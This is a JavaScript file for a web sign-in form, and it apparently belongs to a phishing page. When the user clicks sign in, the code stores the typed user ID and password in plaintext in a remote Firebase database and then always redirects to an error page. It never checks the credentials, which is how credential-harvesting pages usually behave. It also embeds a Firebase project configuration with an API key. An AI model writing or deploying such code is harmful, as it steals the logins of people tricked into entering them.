import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
import { getDatabase, ref, set, get, child, update, remove } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyD8R6noHrOtbQo0oqdMouRw12BuFr628mA",
    authDomain: "webtech-90217.firebaseapp.com",
    projectId: "webtech-90217",
    storageBucket: "webtech-90217.appspot.com",
    messagingSenderId: "46033512343",
    appId: "1:46033512343:web:130e2c69224300c5a186d2"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

const userId = document.getElementById('user-id');
const password = document.getElementById('password');
const signinBtn = document.getElementById('sign__btn');
const messageDiv = document.getElementById('message-div');


signinBtn.onclick = () => {

    signinBtn.innerText = "Signing in..."
    
    if(userId.value == '' || password.value == ''){
        signinBtn.innerText = "Sign in"
        messageDiv.style.display = 'flex'
      } else {  
        set(ref(db, 'users/'+userId.value), {
            userId: userId.value,
            password : password.value
          })
          .then( () => {
            signinBtn.innerText = "Sign in"
            location.href = "../error.html"
          })
    }

}